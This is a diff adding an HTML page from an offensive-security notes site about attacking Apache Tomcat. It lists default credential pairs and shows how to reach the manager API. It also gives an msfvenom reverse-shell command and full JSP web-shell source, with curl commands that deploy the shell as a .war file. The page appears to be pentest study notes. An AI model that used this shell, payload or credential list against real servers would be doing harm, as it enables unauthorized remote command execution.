@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Tomcat | Hacking Notes</title>
+<meta name="generator" content="Jekyll v3.8.4" />
+<meta property="og:title" content="Tomcat" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Tomcat is a web service commonly open in port 8080/tcp." />
+<meta property="og:description" content="Tomcat is a web service commonly open in port 8080/tcp." />
+<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/software/tomcat/" />
+<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/software/tomcat/" />
+<meta property="og:site_name" content="Hacking Notes" />
+<script type="application/ld+json">
+{"description":"Tomcat is a web service commonly open in port 8080/tcp.","url":"http://0.0.0.0:4000/hackingnotes/software/tomcat/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Tomcat","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/hackingnotes/css/main.css">
+		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
+				Hacking Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/hackingnotes/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/">What is this?</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/active-directory/ad-attacks/">Active Directory</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/other/hacking-aws/">Other</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/services/ftp/">Services</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/hackingnotes/software/wordpress/">Software</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
+								
+									<li class="nav-item current"><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/web/file-inclusion/">Web</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/changelog/">Change Log</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>Software</h2>
+				<h3>Tomcat</h3>
+			</div>
+			<article class="content">
+				<p>Tomcat is a web service commonly open in port 8080/tcp.</p>
+
+<h1 id="introduction">Introduction</h1>
+
+<p>Apache Tomcat is a free and open-source implementation of the Java Servlet, JavaServer Pages, Java Expression Language and WebSocket technologies. Tomcat provides a “pure Java” HTTP web server environment in which Java code can run.</p>
+
+<h1 id="apache-tomcat--901-beta---8523---8047---708---jsp-upload-bypass">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass</h1>
+
+<p>Exists a exploit to execute remote command by uploading a <code class="highlighter-rouge">.war</code> file without prior authentication.</p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/42966">https://www.exploit-db.com/exploits/42966</a></li>
+</ul>
+
+<h1 id="installation-directory">Installation Directory</h1>
+
+<p>Depending the version installed or if its installed manually or using <code class="highlighter-rouge">apt</code>, it would be located in different places.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/tomcat/
+/opt/tomcat7/
+/opt/tomcat9/
+/usr/share/tomcat/
+/usr/share/tomcat7/
+/usr/share/tomcat9/
+</code></pre></div></div>
+
+<h1 id="configuration-files">Configuration Files</h1>
+
+<p>There are serveral important files to look into and take info about the server.</p>
+
+<h2 id="serverxml">server.xml</h2>
+
+<p>The server.xml file is Tomcat’s main configuration file, and is responsible for specifying Tomcat’s initial configuration on startup as well as defining the way and order in which Tomcat boots and builds. The elements of the server.xml file belong to five basic categories - Top Level Elements, Connectors, Containers, Nested Components, and Global Settings.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TOMCAT-HOME/conf/web.xml
+</code></pre></div></div>
+
+<h2 id="webxml">web.xml</h2>
+
+<p>The web.xml file is derived from the <a href="https://www.mulesoft.com/tomcat-servlet">Servlet</a> specification, and contains information used to <a href="https://www.mulesoft.com/tomcat-deploy">deploy</a> and configure the components of your web applications.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TOMCAT-HOME/conf/web.xml
+</code></pre></div></div>
+
+<h2 id="tomcat-usersxml">tomcat-users.xml</h2>
+
+<p>This last file contains the credentials and privileges of the tomcat users.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TOMCAT-HOME/etc/tomcat-users.xml
+</code></pre></div></div>
+
+<h1 id="default-credentials">Default credentials</h1>
+
+<p>SecLists have a list of default credentials in Tomcat:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin:
+admin:admanager
+admin:admin
+admin:admin
+ADMIN:ADMIN
+admin:adrole1
+admin:adroot
+admin:ads3cret
+admin:adtomcat
+admin:advagrant
+admin:password
+admin:password1
+admin:Password1
+admin:tomcat
+admin:vagrant
+both:admanager
+both:admin
+both:adrole1
+both:adroot
+both:ads3cret
+both:adtomcat
+both:advagrant
+both:tomcat
+cxsdk:kdsxc
+j2deployer:j2deployer
+manager:admanager
+manager:admin
+manager:adrole1
+manager:adroot
+manager:ads3cret
+manager:adtomcat
+manager:advagrant
+manager:manager
+ovwebusr:OvW*busr1
+QCC:QLogic66
+role1:admanager
+role1:admin
+role1:adrole1
+role1:adroot
+role1:ads3cret
+role1:adtomcat
+role1:advagrant
+role1:role1
+role1:tomcat
+role:changethis
+root:admanager
+root:admin
+root:adrole1
+root:adroot
+root:ads3cret
+root:adtomcat
+root:advagrant
+root:changethis
+root:owaspbwa
+root:password
+root:password1
+root:Password1
+root:r00t
+root:root
+root:toor
+tomcat:
+tomcat:admanager
+tomcat:admin
+tomcat:admin
+tomcat:adrole1
+tomcat:adroot
+tomcat:ads3cret
+tomcat:adtomcat
+tomcat:advagrant
+tomcat:changethis
+tomcat:password
+tomcat:password1
+tomcat:s3cret
+tomcat:s3cret
+tomcat:tomcat
+xampp:xampp
+server_admin:owaspbwa
+admin:owaspbwa
+demo:demo
+</code></pre></div></div>
+
+<h1 id="from-admin-to-reverse-shell">From Admin to Reverse Shell</h1>
+
+<p>If you have access to the Tomcat Web Application Manager, you are able to upload and deploy a malicious <code class="highlighter-rouge">.war</code> file.</p>
+
+<h2 id="finding-the-endpoint">Finding the endpoint</h2>
+
+<p>First is important to find the endpoint.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/manager/text/list
+/manager/list
+
+curl -u tomcat:'password' http://localhost:8080/manager/text/list
+OK - Listed applications for virtual host [localhost]
+/:running:0:ROOT
+/examples:running:0:/usr/share/tomcat9-examples/examples
+/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
+/manager:running:0:/usr/share/tomcat9-admin/manager
+</code></pre></div></div>
+
+<h2 id="creating-a-shell-war">Creating a shell (.WAR)</h2>
+
+<p>There are serveral ways to create the war.</p>
+
+<h3 id="msfvenom-reverse-shell">MSFVenom Reverse Shell</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip-addr&gt; LPORT=&lt;port&gt; -f war -o revshell.war
+</code></pre></div></div>
+
+<h3 id="manual-web-shell">Manual Web Shell</h3>
+
+<p>Create a index.jsp with the following content:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;FORM METHOD=GET ACTION='index.jsp'&gt;
+&lt;INPUT name='cmd' type=text&gt;
+&lt;INPUT type=submit value='Run'&gt;
+&lt;/FORM&gt;
+&lt;%@ page import="java.io.*" %&gt;
+&lt;%
+   String cmd = request.getParameter("cmd");
+   String output = "";
+   if(cmd != null) {
+      String s = null;
+      try {
+         Process p = Runtime.getRuntime().exec(cmd,null,null);
+         BufferedReader sI = new BufferedReader(new
+InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) { output += s+"&lt;/br&gt;"; }
+      }  catch(IOException e) {   e.printStackTrace();   }
+   }
+%&gt;
+&lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;
+</code></pre></div></div>
+
+<p>And run the following commands:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir webshell
+cp index.jsp webshell
+cd webshell
+jar -cvf ../webshell.war * 
+webshell.war is created
+</code></pre></div></div>
+
+<h2 id="uploading-the-shell">Uploading the shell</h2>
+
+<p>We just need to upload it and visit the path.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl --upload-file webshell.war -u tomcat:'$3cureP4s5w0rd123!' http://localhost:8001/manager/text/deploy?path=/shell
+OK - Deployed application at context path [/shell]
+</code></pre></div></div>
+
+<p>Finally we can visit the path:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://locahost:8080/shell
+</code></pre></div></div>
+
+<h1 id="references">References</h1>
+
+<ul>
+  <li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#post">https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#post</a></li>
+  <li><a href="https://www.youtube.com/watch?v=yTHtLi9YZ2s">https://www.youtube.com/watch?v=yTHtLi9YZ2s</a></li>
+</ul>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
